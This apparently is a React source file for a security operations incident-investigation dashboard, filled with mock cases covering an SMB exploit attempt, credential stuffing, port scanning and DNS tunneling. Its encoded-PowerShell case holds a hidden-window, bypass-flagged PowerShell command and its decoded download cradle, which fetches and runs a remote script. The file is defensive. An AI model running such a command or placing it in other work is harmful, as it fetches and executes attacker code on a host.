/**
 * Security Incident Investigation Desk — ULPF Sovereign SOC Command Center
 *
 * Full lifecycle management (NEW -> TRIAGED -> IN_PROGRESS -> RESOLVED -> ESCALATED_CERTIN)
 * with dynamic 5W1H threat attribution, chronological telemetry evidence streams,
 * IoC containment triggers, analyst notes journal, Section 65B dossier generation,
 * and SOAR playbook dispatch pivots.
 */

import React, { useState, useMemo, useEffect } from 'react';
import { useSearchParams, useNavigate } from 'react-router-dom';
import { Card } from '../components/ui/Card';
import { Badge } from '../components/ui/Badge';
import { Button } from '../components/ui/Button';
import { Modal } from '../components/ui/Modal';
import { Section65BCertificate } from '../components/forensic/Section65BCertificate';
import {
  Search,
  ShieldAlert,
  Clock,
  User,
  HardDrive,
  CheckCircle2,
  AlertTriangle,
  FileCheck,
  Zap,
  Lock,
  Eye,
  Terminal,
  Activity,
  ChevronRight,
  ExternalLink,
  Download,
  Copy,
  Check,
  Plus,
  Filter,
  FileText,
  Shield,
  Layers,
  ArrowRight,
  Sparkles,
  RotateCcw,
  Send,
  SlidersHorizontal,
  X,
  Globe,
  Radio,
  Server,
  Fingerprint,
  Play,
} from 'lucide-react';

// ---------------------------------------------------------------------------
// Type Definitions
// ---------------------------------------------------------------------------

export type CaseSeverity = 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
export type CaseStatus = 'NEW' | 'TRIAGED' | 'IN_PROGRESS' | 'RESOLVED' | 'ESCALATED_CERTIN';
export type IoCType = 'IPv4' | 'DOMAIN' | 'HASH_SHA256' | 'PROCESS' | 'CVE';
export type IoCStatus = 'ACTIVE' | 'BLOCKED' | 'QUARANTINED' | 'MONITORED';

export interface IoCItem {
  id: string;
  type: IoCType;
  value: string;
  confidence: number;
  reputation: 'MALICIOUS' | 'CONFIRMED_THREAT' | 'SUSPICIOUS';
  status: IoCStatus;
  firstSeen: string;
}

export interface TimelineEvent {
  id: string;
  timestamp: string;
  event: string;
  source: string;
  vendor: string;
  action: 'DENY' | 'ALERT' | 'DETECT' | 'BLOCK' | 'ALLOW';
  casHash: string;
  details: string;
  mitreId?: string;
}

export interface AnalystNote {
  id: string;
  author: string;
  role: string;
  timestamp: string;
  category: 'Initial Assessment' | 'Forensic Analysis' | 'Containment Action' | 'CERT-In Statutory Note';
  content: string;
}

export interface InvestigationCase {
  id: string;
  relatedAlertIds: string[];
  title: string;
  severity: CaseSeverity;
  status: CaseStatus;
  analyst: string;
  created: string;
  updated: string;
  category: string;
  slaDeadlineIst: string;
  slaHoursRemaining: number;
  mitreTechniques: Array<{ id: string; name: string; tactic: string }>;
  recommendedPlaybook: {
    id: string;
    name: string;
    reason: string;
    blastRadius: 'HIGH' | 'MEDIUM' | 'LOW';
    targetAsset: string;
  };
  matrix5W1H: {
    who: {
      attacker: string;
      attribution: string;
      geo: string;
      asn: string;
      threatActor?: string;
    };
    what: {
      attackType: string;
      technique: string;
      targetProtocol: string;
      payloadSummary: string;
    };
    where: {
      asset: string;
      zone: string;
      hostname: string;
      subnet: string;
    };
    when: {
      firstSeen: string;
      lastSeen: string;
      burstDuration: string;
      eventCount: number;
    };
    why: {
      ruleTriggered: string;
      cve: string;
      confidence: string;
      intent: string;
    };
    how: {
      executionPath: string;
      privilege: string;
      parentProcess?: string;
      childProcess?: string;
    };
  };
  iocs: IoCItem[];
  timeline: TimelineEvent[];
  notes: AnalystNote[];
  forensicChain: {
    merkleRoot: string;
    section65bCertId: string;
    blockHeight: number;
    poaSignature: string;
    totalRecordsVerified: number;
  };
}

// ---------------------------------------------------------------------------
// Mock Sovereign Case Registry
// ---------------------------------------------------------------------------

const INITIAL_CASES: InvestigationCase[] = [
  {
    id: 'CASE-2026-0913',
    relatedAlertIds: ['DET-88192', 'evt-suricata-88220', 'evt-panos-88219'],
    title: 'Multi-Stage Lateral Movement Campaign & SMB Exploit',
    severity: 'CRITICAL',
    status: 'IN_PROGRESS',
    category: 'Lateral Movement / Remote Code Execution',
    analyst: 'Analyst-04 (Gov SOC)',
    created: '2026-09-13 17:15:24 IST',
    updated: '4m ago',
    slaDeadlineIst: '2026-09-13 23:15:24 IST',
    slaHoursRemaining: 2.8,
    mitreTechniques: [
      { id: 'T1021.002', name: 'SMB / Windows Shares', tactic: 'TA0008 Lateral Movement' },
      { id: 'T1210', name: 'Exploitation of Remote Services', tactic: 'TA0008 Lateral Movement' },
      { id: 'T1059.001', name: 'PowerShell Interpreter', tactic: 'TA0002 Execution' },
    ],
    recommendedPlaybook: {
      id: 'PB-RANSOMWARE-CONTAINMENT',
      name: 'Emergency Host & Lateral Ransomware Containment',
      reason: 'Automated quarantine needed to halt SMB lateral spread across subnet 10.0.1.0/24.',
      blastRadius: 'HIGH',
      targetAsset: '10.0.1.45 / srv-fin-db-01',
    },
    matrix5W1H: {
      who: {
        attacker: '198.51.100.99',
        attribution: 'Suspected UNC3886 / Volt Typhoon precursor',
        geo: 'External Ingress (Bulletproof ASN-64500)',
        asn: 'AS-64500 (Offshore Relay)',
        threatActor: 'APT-StateSponsored-Actor',
      },
      what: {
        attackType: 'SMBv2 Compressed Data Header Heap Overflow Attempt',
        technique: 'Remote Services: SMB / Windows Shares (T1021.002)',
        targetProtocol: 'TCP/445 (SMB/CIFS)',
        payloadSummary: 'Kernel memory corruption probe targeting srv-fin-db-01 via crafted SMB2 packets',
      },
      where: {
        asset: '10.0.1.45 / srv-fin-db-01 (Ubuntu 22.04 LTS)',
        zone: 'Zone untrust -> Zone trust (Perimeter Gateway)',
        hostname: 'srv-fin-db-01.finance.ntro.internal',
        subnet: 'Subnet 10.0.1.0/24 (Critical Financial Tier)',
      },
      when: {
        firstSeen: '17:15:22.140 UTC',
        lastSeen: '17:15:26.890 UTC',
        burstDuration: '4.75 seconds',
        eventCount: 142,
      },
      why: {
        ruleTriggered: 'RULE-CORR-SMB-LATERAL (Multi-Sensor Correlated)',
        cve: 'CVE-2020-0796 (EternalDarkness)',
        confidence: '98.4% Confidence Score',
        intent: 'Pre-ransomware credential acquisition and lateral privilege escalation',
      },
      how: {
        executionPath: 'Network Ingress -> Palo Alto Firewall -> Suricata NIDS Alert -> EDR Kernel Hook',
        privilege: 'Targeting root / SYSTEM level execution',
        parentProcess: 'sshd (PID 1420)',
        childProcess: '/usr/sbin/smbd (PID 2891)',
      },
    },
    iocs: [
      {
        id: 'IOC-01',
        type: 'IPv4',
        value: '198.51.100.99',
        confidence: 99,
        reputation: 'CONFIRMED_THREAT',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:22 IST',
      },
      {
        id: 'IOC-02',
        type: 'CVE',
        value: 'CVE-2020-0796',
        confidence: 100,
        reputation: 'MALICIOUS',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:22 IST',
      },
      {
        id: 'IOC-03',
        type: 'HASH_SHA256',
        value: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
        confidence: 96,
        reputation: 'MALICIOUS',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:24 IST',
      },
      {
        id: 'IOC-04',
        type: 'PROCESS',
        value: 'smbd: heap-exploit-worker.so',
        confidence: 91,
        reputation: 'SUSPICIOUS',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:25 IST',
      },
    ],
    timeline: [
      {
        id: 'TL-01',
        timestamp: '17:15:22.140Z',
        event: 'Ingress SYN packet sweep from 198.51.100.99:51423',
        source: 'fw01-edge.ntro.internal',
        vendor: 'Palo Alto PAN-OS',
        action: 'DENY',
        casHash: 'cas/9f/9f83c18b76a02b1f8910d54e43e2e8f1982b6c7a4d5e9f8012b3c4d5e6f70812',
        details: 'Blocked by perimeter rule Rule-Block-Lateral. Destination port: 445/TCP.',
        mitreId: 'T1021.002',
      },
      {
        id: 'TL-02',
        timestamp: '17:15:24.890Z',
        event: 'ET EXPLOIT SMB2 Compressed Data Header Heap Overflow Attempt',
        source: 'nids-sensor-02.dmz.internal',
        vendor: 'OISF Suricata',
        action: 'ALERT',
        casHash: 'cas/a1/a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
        details: 'Suricata signature 2029104 triggered. Attempted Administrator Privilege Gain.',
        mitreId: 'T1210',
      },
      {
        id: 'TL-03',
        timestamp: '17:15:25.405Z',
        event: 'Unexpected process thread fork detected under smbd worker',
        source: 'srv-fin-db-01.finance.ntro.internal',
        vendor: 'Linux Auditd (Go Audit)',
        action: 'DETECT',
        casHash: 'cas/3b/3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c',
        details: 'Auditd syscall clone(CLONE_VM|CLONE_VFORK) with suspicious shell invocation.',
        mitreId: 'T1059.001',
      },
      {
        id: 'TL-04',
        timestamp: '17:15:26.890Z',
        event: 'Correlated Multi-Sensor Threat Detection DET-88192 Formed',
        source: 'ULPF Sovereign Correlation Engine',
        vendor: 'ULPF Sovereign Engine',
        action: 'BLOCK',
        casHash: 'cas/70/70860df3cc8060cbf30aaa94f441d89cbfb9ecb98b0eaf38acc54470e2c566eb',
        details: 'Confidence 98.4%. Case CASE-2026-0913 automatically provisioned with 6h CERT-In timer.',
      },
    ],
    notes: [
      {
        id: 'NOTE-01',
        author: 'Gov SOC Automation Agent',
        role: 'Orchestration Engine',
        timestamp: '2026-09-13 17:15:27 IST',
        category: 'Initial Assessment',
        content: 'Correlated SMB exploit attempt matched rule RULE-CORR-SMB-LATERAL across PAN-OS and Suricata. Automatic quarantine playbook recommended.',
      },
      {
        id: 'NOTE-02',
        author: 'Analyst-04 (Gov SOC)',
        role: 'Tier 2 SOC Analyst',
        timestamp: '2026-09-13 17:21:10 IST',
        category: 'Forensic Analysis',
        content: 'Verified raw pcap payload: weaponized SMB2 header matches CVE-2020-0796. IP 198.51.100.99 belongs to bulletproof hosting cluster associated with recent attacks on public sector assets.',
      },
    ],
    forensicChain: {
      merkleRoot: '70860df3cc8060cbf30aaa94f441d89cbfb9ecb98b0eaf38acc54470e2c566eb',
      section65bCertId: 'CERT-65B-2026-0913-001',
      blockHeight: 10482,
      poaSignature: 'e698193cfa4a85d6370a5dbb328b6197d51b5e89e8d4afb07218fff97b94dc7e',
      totalRecordsVerified: 142,
    },
  },
  {
    id: 'CASE-2026-0912',
    relatedAlertIds: ['DET-88191', 'evt-nginx-88224'],
    title: 'Distributed Credential Stuffing & SQL Injection Probe',
    severity: 'HIGH',
    status: 'TRIAGED',
    category: 'Credential Access / Web Exploitation',
    analyst: 'Analyst-01 (Tier 2 Lead)',
    created: '2026-09-13 17:15:45 IST',
    updated: '18m ago',
    slaDeadlineIst: '2026-09-13 23:15:45 IST',
    slaHoursRemaining: 4.2,
    mitreTechniques: [
      { id: 'T1110.001', name: 'Password Guessing', tactic: 'TA0006 Credential Access' },
      { id: 'T1190', name: 'Exploit Public-Facing Application', tactic: 'TA0001 Initial Access' },
    ],
    recommendedPlaybook: {
      id: 'PB-CREDENTIAL-REVOCATION',
      name: 'Compromised Credential Revocation & Session Purge',
      reason: 'Repeated authentication failures against administrative accounts.',
      blastRadius: 'MEDIUM',
      targetAsset: 'api-gw-01.dmz.internal (user: admin)',
    },
    matrix5W1H: {
      who: {
        attacker: '203.0.113.88',
        attribution: 'Automated Botnet Cluster / Anonymous Proxy',
        geo: 'Eastern Europe / Commercial VPS',
        asn: 'AS-48190 (Cloud Egress Gateway)',
        threatActor: 'Botnet-Spray-Operator',
      },
      what: {
        attackType: 'Sequential Brute Force & Blind SQL Injection in Auth Header',
        technique: 'Brute Force: Password Guessing (T1110.001)',
        targetProtocol: 'HTTPS/443',
        payloadSummary: 'POST /api/v1/auth/login with sqlmap user-agent and boolean-based SQL injection probes',
      },
      where: {
        asset: '10.0.0.15 / api-gw-01.dmz.internal',
        zone: 'DMZ Public Ingress Gateway',
        hostname: 'api-gw-01.dmz.internal',
        subnet: '10.0.0.0/24 (Edge Load Balancer Subnet)',
      },
      when: {
        firstSeen: '17:15:30.000 UTC',
        lastSeen: '17:15:51.650 UTC',
        burstDuration: '21.65 seconds',
        eventCount: 58,
      },
      why: {
        ruleTriggered: 'RULE-BRUTEFORCE-WEB-AUTH (Rapid Sequential Authentication Failures)',
        cve: 'CWE-89 (SQL Injection) / CWE-307',
        confidence: '94.2% Confidence Score',
        intent: 'Credential harvesting and administrative database backend bypass',
      },
      how: {
        executionPath: 'HTTP POST /api/v1/auth/login -> Nginx Reverse Proxy -> Node API Gateway -> Auth Backend',
        privilege: 'Attempting to gain admin role token',
        parentProcess: 'nginx: worker process',
        childProcess: 'node /app/server.js',
      },
    },
    iocs: [
      {
        id: 'IOC-05',
        type: 'IPv4',
        value: '203.0.113.88',
        confidence: 95,
        reputation: 'CONFIRMED_THREAT',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:30 IST',
      },
      {
        id: 'IOC-06',
        type: 'PROCESS',
        value: 'User-Agent: sqlmap/1.6.12#stable',
        confidence: 99,
        reputation: 'MALICIOUS',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:31 IST',
      },
    ],
    timeline: [
      {
        id: 'TL-05',
        timestamp: '17:15:30.120Z',
        event: 'POST /api/v1/auth/login 401 Unauthorized (14 consecutive requests)',
        source: 'api-gw-01.dmz.internal',
        vendor: 'Nginx Access Gateway',
        action: 'DENY',
        casHash: 'cas/6e/6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f',
        details: 'User "admin" failed authentication threshold. Rate limit triggered.',
        mitreId: 'T1110.001',
      },
      {
        id: 'TL-06',
        timestamp: '17:15:45.650Z',
        event: 'SQL Injection probe string detected in X-Forwarded-Authorization',
        source: 'waf-sensor-01.dmz.internal',
        vendor: 'ModSecurity / Coraza WAF',
        action: 'ALERT',
        casHash: 'cas/2d/2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e',
        details: 'Matched OWASP CRS Rule 942100: SQL Injection Attack Detected via libinjection.',
        mitreId: 'T1190',
      },
    ],
    notes: [
      {
        id: 'NOTE-03',
        author: 'Analyst-01 (Tier 2 Lead)',
        role: 'Tier 2 SOC Lead',
        timestamp: '2026-09-13 17:28:40 IST',
        category: 'Initial Assessment',
        content: 'IP 203.0.113.88 placed on temporary edge rate-limit. No valid session token was issued. Recommend IP containment rule.',
      },
    ],
    forensicChain: {
      merkleRoot: '6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f',
      section65bCertId: 'CERT-65B-2026-0912-002',
      blockHeight: 10483,
      poaSignature: 'a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9',
      totalRecordsVerified: 58,
    },
  },
  {
    id: 'CASE-2026-0911',
    relatedAlertIds: ['DET-88190', 'evt-sysmon-88222'],
    title: 'Suspicious Base64 Encoded PowerShell Execution',
    severity: 'HIGH',
    status: 'IN_PROGRESS',
    category: 'Endpoint Execution / Obfuscation',
    analyst: 'Analyst-02 (Forensics Lead)',
    created: '2026-09-13 17:15:35 IST',
    updated: '25m ago',
    slaDeadlineIst: '2026-09-13 23:15:35 IST',
    slaHoursRemaining: 4.5,
    mitreTechniques: [
      { id: 'T1059.001', name: 'PowerShell Interpreter', tactic: 'TA0002 Execution' },
      { id: 'T1027', name: 'Obfuscated Files or Information', tactic: 'TA0005 Defense Evasion' },
    ],
    recommendedPlaybook: {
      id: 'PB-HOST-ISOLATION',
      name: 'Compromised Node Network Quarantine',
      reason: 'Obfuscated download cradle detected on domain controller.',
      blastRadius: 'MEDIUM',
      targetAsset: 'WIN-DC01.ad.ntro.internal (10.0.1.50)',
    },
    matrix5W1H: {
      who: {
        attacker: 'Local SYSTEM (Parent: cmd.exe PID 4912)',
        attribution: 'Potential credential dump or staging tool',
        geo: 'Internal Domain Controller',
        asn: 'Enterprise Internal AD',
        threatActor: 'Unknown Internal Beacon',
      },
      what: {
        attackType: 'Base64 Encoded PowerShell In-Memory Assembly Loading',
        technique: 'Command and Scripting: PowerShell (T1059.001)',
        targetProtocol: 'Local IPC / Egress HTTPS',
        payloadSummary: 'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3...',
      },
      where: {
        asset: '10.0.1.50 / WIN-DC01.ad.ntro.internal',
        zone: 'Core Identity Infrastructure',
        hostname: 'WIN-DC01.ad.ntro.internal',
        subnet: '10.0.1.0/24 (Domain Controller Segment)',
      },
      when: {
        firstSeen: '17:15:35.405 UTC',
        lastSeen: '17:15:36.120 UTC',
        burstDuration: '0.715 seconds',
        eventCount: 18,
      },
      why: {
        ruleTriggered: 'RULE-SYSMON-ENCODED-PS (Base64 Obfuscated PowerShell Command)',
        cve: 'N/A (Technique T1059.001)',
        confidence: '91.8% Confidence Score',
        intent: 'In-memory execution of remote payload to evade disk-based anti-virus',
      },
      how: {
        executionPath: 'Scheduled Task / Service -> cmd.exe -> powershell.exe -> Net.WebClient',
        privilege: 'NT AUTHORITY\\SYSTEM',
        parentProcess: 'C:\\Windows\\System32\\cmd.exe (PID 4912)',
        childProcess: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe (PID 6108)',
      },
    },
    iocs: [
      {
        id: 'IOC-07',
        type: 'HASH_SHA256',
        value: '8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a',
        confidence: 92,
        reputation: 'CONFIRMED_THREAT',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:35 IST',
      },
      {
        id: 'IOC-08',
        type: 'DOMAIN',
        value: 'tunnel.staging-defense.in',
        confidence: 96,
        reputation: 'MALICIOUS',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 17:15:36 IST',
      },
    ],
    timeline: [
      {
        id: 'TL-07',
        timestamp: '17:15:35.405Z',
        event: 'Sysmon EventID 1: Process Create powershell.exe with -EncodedCommand',
        source: 'WIN-DC01.ad.ntro.internal',
        vendor: 'Microsoft Sysmon XML',
        action: 'DETECT',
        casHash: 'cas/8f/8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a',
        details: 'Decoded payload: IEX (New-Object Net.WebClient).DownloadString("https://tunnel.staging-defense.in/stage2.ps1")',
        mitreId: 'T1059.001',
      },
    ],
    notes: [
      {
        id: 'NOTE-04',
        author: 'Analyst-02 (Forensics Lead)',
        role: 'Forensic Investigator',
        timestamp: '2026-09-13 17:34:15 IST',
        category: 'Forensic Analysis',
        content: 'Egress domain tunnel.staging-defense.in was sinkholed at the resolver level. Memory dump requested for WIN-DC01 PID 6108.',
      },
    ],
    forensicChain: {
      merkleRoot: '8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a',
      section65bCertId: 'CERT-65B-2026-0911-003',
      blockHeight: 10484,
      poaSignature: 'f1e2d3c4b5a6978869504132231445566778899aabbccddeeff00112233445566',
      totalRecordsVerified: 18,
    },
  },
  {
    id: 'CASE-2026-0041',
    relatedAlertIds: ['ALERT-PERIMETER-0041'],
    title: 'Perimeter Breach Attempt on Subnet 10.0.1.0/24',
    severity: 'HIGH',
    status: 'IN_PROGRESS',
    category: 'Perimeter Reconnaissance & Ingress Probe',
    analyst: 'Analyst-04 (Gov SOC)',
    created: '2026-09-13 16:45:00 IST',
    updated: '35m ago',
    slaDeadlineIst: '2026-09-13 22:45:00 IST',
    slaHoursRemaining: 5.1,
    mitreTechniques: [
      { id: 'T1046', name: 'Network Service Discovery', tactic: 'TA0007 Discovery' },
      { id: 'T1595.001', name: 'Port Scanning', tactic: 'TA0043 Reconnaissance' },
    ],
    recommendedPlaybook: {
      id: 'PB-FIREWALL-EGRESS-SEVER',
      name: 'Emergency Egress Severance & Border ACL Lockdown',
      reason: 'Rapid port sweep from external CIDR block.',
      blastRadius: 'MEDIUM',
      targetAsset: 'cisco-asa-edge-01 / Subnet 10.0.1.0/24',
    },
    matrix5W1H: {
      who: {
        attacker: '198.51.100.114',
        attribution: 'Mass Scanner / Automated Reconnaissance Agent',
        geo: 'External Autonomous System 64512',
        asn: 'AS-64512 (Hostinger/LeaseWeb)',
      },
      what: {
        attackType: 'TCP SYN Sweep against Ingress Gateway Ports 22, 80, 443, 445, 3389',
        technique: 'Port Scanning (T1595.001)',
        targetProtocol: 'TCP SYN',
        payloadSummary: 'Rapid zero-payload SYN probe measuring TCP window responses',
      },
      where: {
        asset: 'Subnet 10.0.1.0/24 (VLAN 101)',
        zone: 'Perimeter Firewall cisco-asa-edge-01',
        hostname: 'cisco-asa-edge-01.ntro.internal',
        subnet: '10.0.1.0/24',
      },
      when: {
        firstSeen: '16:44:12.000 UTC',
        lastSeen: '16:44:30.400 UTC',
        burstDuration: '18.4 seconds',
        eventCount: 142,
      },
      why: {
        ruleTriggered: 'RULE-PERIMETER-SWEEP (Sequential Subnet Ingress Probe)',
        cve: 'N/A',
        confidence: '97.0% Confidence Score',
        intent: 'Enumerating open ingress management ports for vulnerability matching',
      },
      how: {
        executionPath: 'External Internet -> Edge Router -> Cisco ASA Access-List -> Syslog',
        privilege: 'Unauthenticated Network Probe',
      },
    },
    iocs: [
      {
        id: 'IOC-09',
        type: 'IPv4',
        value: '198.51.100.114',
        confidence: 97,
        reputation: 'CONFIRMED_THREAT',
        status: 'ACTIVE',
        firstSeen: '2026-09-13 16:44:12 IST',
      },
    ],
    timeline: [
      {
        id: 'TL-08',
        timestamp: '16:44:12.102Z',
        event: 'Cisco ASA ACL drop: 198.51.100.114:48122 -> 10.0.1.10:22',
        source: 'cisco-asa-edge-01',
        vendor: 'Cisco Systems',
        action: 'DENY',
        casHash: 'cas/4a/4a5e1e2d3c4b5a6978869504132231445566778899aabbccddeeff0011223344',
        details: 'Built inbound TCP connection dropped by access-list OUTSIDE_IN.',
        mitreId: 'T1046',
      },
      {
        id: 'TL-09',
        timestamp: '16:44:14.220Z',
        event: 'Repeated probe on port 445/SMB and 3389/RDP dropped',
        source: 'cisco-asa-edge-01',
        vendor: 'Cisco Systems',
        action: 'DENY',
        casHash: 'cas/1b/1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c',
        details: 'Drop count exceeded 100 packets in 20-second window.',
        mitreId: 'T1595.001',
      },
    ],
    notes: [
      {
        id: 'NOTE-05',
        author: 'Analyst-04 (Gov SOC)',
        role: 'Tier 2 SOC Analyst',
        timestamp: '2026-09-13 16:52:10 IST',
        category: 'Initial Assessment',
        content: 'Perimeter ACL successfully dropped all 142 sweep attempts. Threat actor source 198.51.100.114 queued for boundary null-route.',
      },
    ],
    forensicChain: {
      merkleRoot: '4a5e1e2d3c4b5a6978869504132231445566778899aabbccddeeff0011223344',
      section65bCertId: 'CERT-65B-2026-0041-004',
      blockHeight: 10480,
      poaSignature: '3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c',
      totalRecordsVerified: 142,
    },
  },
  {
    id: 'CASE-2026-0040',
    relatedAlertIds: ['ALERT-IAM-LOCKOUT-0040'],
    title: 'Suspicious Administrative Account Lockout Storm',
    severity: 'MEDIUM',
    status: 'TRIAGED',
    category: 'Identity & Access / Account Lockout',
    analyst: 'Analyst-01 (Tier 2 Lead)',
    created: '2026-09-13 16:15:00 IST',
    updated: '1h ago',
    slaDeadlineIst: '2026-09-13 22:15:00 IST',
    slaHoursRemaining: 5.6,
    mitreTechniques: [
      { id: 'T1110.003', name: 'Password Spraying', tactic: 'TA0006 Credential Access' },
    ],
    recommendedPlaybook: {
      id: 'PB-SESSION-INVALIDATION',
      name: 'Admin Session Invalidation & Token Revocation',
      reason: 'Multiple administrative accounts locked out simultaneously.',
      blastRadius: 'LOW',
      targetAsset: 'Active Directory Domain Controller (WIN-DC01)',
    },
    matrix5W1H: {
      who: {
        attacker: 'Internal Host 10.0.2.14 / ws-finance-04',
        attribution: 'Misconfigured service account or internal script',
        geo: 'Internal Workstation Segment',
        asn: 'Enterprise LAN',
      },
      what: {
        attackType: 'Kerberos Pre-Authentication Failure Storm (EventID 4740)',
        technique: 'Password Spraying (T1110.003)',
        targetProtocol: 'Kerberos / Port 88',
        payloadSummary: 'Repeated pre-auth requests using invalid legacy credentials',
      },
      where: {
        asset: 'WIN-DC01.ad.ntro.internal',
        zone: 'Domain Controller LAN',
        hostname: 'WIN-DC01',
        subnet: '10.0.1.0/24',
      },
      when: {
        firstSeen: '16:12:00.000 UTC',
        lastSeen: '16:15:00.000 UTC',
        burstDuration: '3.0 minutes',
        eventCount: 58,
      },
      why: {
        ruleTriggered: 'RULE-AUTH-LOCKOUT-STORM (Sequential Account Lockouts)',
        cve: 'N/A',
        confidence: '88.5% Confidence Score',
        intent: 'Investigating whether an automated script or lateral credential spray is active',
      },
      how: {
        executionPath: 'Workstation ws-finance-04 -> Kerberos AS-REQ -> KDC 4771/4740',
        privilege: 'Domain User',
      },
    },
    iocs: [
      {
        id: 'IOC-10',
        type: 'IPv4',
        value: '10.0.2.14',
        confidence: 90,
        reputation: 'SUSPICIOUS',
        status: 'MONITORED',
        firstSeen: '2026-09-13 16:12:00 IST',
      },
    ],
    timeline: [
      {
        id: 'TL-10',
        timestamp: '16:12:04.112Z',
        event: 'EventID 4771: Kerberos pre-auth failed for svc_sqlbackup',
        source: 'WIN-DC01',
        vendor: 'Microsoft Security Event Log',
        action: 'ALERT',
        casHash: 'cas/5c/5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
        details: 'Failure code 0x18 (Bad password) repeated 12 times.',
        mitreId: 'T1110.003',
      },
    ],
    notes: [
      {
        id: 'NOTE-06',
        author: 'Analyst-01 (Tier 2 Lead)',
        role: 'Tier 2 SOC Lead',
        timestamp: '2026-09-13 16:30:00 IST',
        category: 'Forensic Analysis',
        content: 'Workstation user confirmed an outdated scheduled backup task was attempting to authenticate with expired credentials. Safe resolution in progress.',
      },
    ],
    forensicChain: {
      merkleRoot: '5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
      section65bCertId: 'CERT-65B-2026-0040-005',
      blockHeight: 10478,
      poaSignature: '7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f',
      totalRecordsVerified: 58,
    },
  },
  {
    id: 'CASE-2026-0039',
    relatedAlertIds: ['ALERT-DNS-ANOMALY-0039', 'DET-88189'],
    title: 'Correlated DNS Query Anomaly from Core DNS',
    severity: 'LOW',
    status: 'RESOLVED',
    category: 'Command and Control / DNS Tunneling',
    analyst: 'Analyst-02 (Forensics Lead)',
    created: '2026-09-13 14:00:00 IST',
    updated: '2h ago',
    slaDeadlineIst: '2026-09-13 20:00:00 IST',
    slaHoursRemaining: 0,
    mitreTechniques: [
      { id: 'T1071.004', name: 'DNS Tunneling', tactic: 'TA0011 Command and Control' },
    ],
    recommendedPlaybook: {
      id: 'PB-DNS-SINKHOLE',
      name: 'Autonomous DNS Sinkhole & Poisoned Resolution',
      reason: 'Low-frequency base32 encoded TXT DNS queries detected.',
      blastRadius: 'LOW',
      targetAsset: 'core-dns-01 (10.0.0.2)',
    },
    matrix5W1H: {
      who: {
        attacker: '10.0.1.45 (Querying host)',
        attribution: 'Staging environment benchmark agent',
        geo: 'Internal Lab Network',
        asn: 'Internal Subnet',
      },
      what: {
        attackType: 'Outbound DNS TXT Query Tunneling Simulation',
        technique: 'Application Layer Protocol: DNS (T1071.004)',
        targetProtocol: 'UDP/53',
        payloadSummary: 'Base32 subdomains queried against tunnel.staging-defense.in',
      },
      where: {
        asset: 'core-dns-01.ntro.internal (10.0.0.2)',
        zone: 'Internal Core Services',
        hostname: 'core-dns-01',
        subnet: '10.0.0.0/24',
      },
      when: {
        firstSeen: '13:58:10.000 UTC',
        lastSeen: '14:00:15.000 UTC',
        burstDuration: '2.08 minutes',
        eventCount: 12,
      },
      why: {
        ruleTriggered: 'RULE-DNS-TUNNELING-HEURISTIC',
        cve: 'N/A',
        confidence: '85.1% Confidence Score',
        intent: 'Controlled red team validation of DNS exfiltration detection filters',
      },
      how: {
        executionPath: 'Synthetic generator script -> local stub resolver -> Core BIND9',
        privilege: 'Standard User',
      },
    },
    iocs: [
      {
        id: 'IOC-11',
        type: 'DOMAIN',
        value: 'tunnel.staging-defense.in',
        confidence: 88,
        reputation: 'SUSPICIOUS',
        status: 'BLOCKED',
        firstSeen: '2026-09-13 13:58:10 IST',
      },
    ],
    timeline: [
      {
        id: 'TL-11',
        timestamp: '13:58:10.420Z',
        event: 'High-entropy TXT query for q7x3z1.tunnel.staging-defense.in',
        source: 'core-dns-01',
        vendor: 'ISC BIND9 DNS Query Log',
        action: 'DETECT',
        casHash: 'cas/9a/9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
        details: 'Shannon entropy 4.62 bits/byte on subdomain labels.',
        mitreId: 'T1071.004',
      },
      {
        id: 'TL-12',
        timestamp: '14:05:00.000Z',
        event: 'Domain tunnel.staging-defense.in added to internal sinkhole zone',
        source: 'core-dns-01',
        vendor: 'DNS RPZ Response Policy',
        action: 'BLOCK',
        casHash: 'cas/0b/0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c',
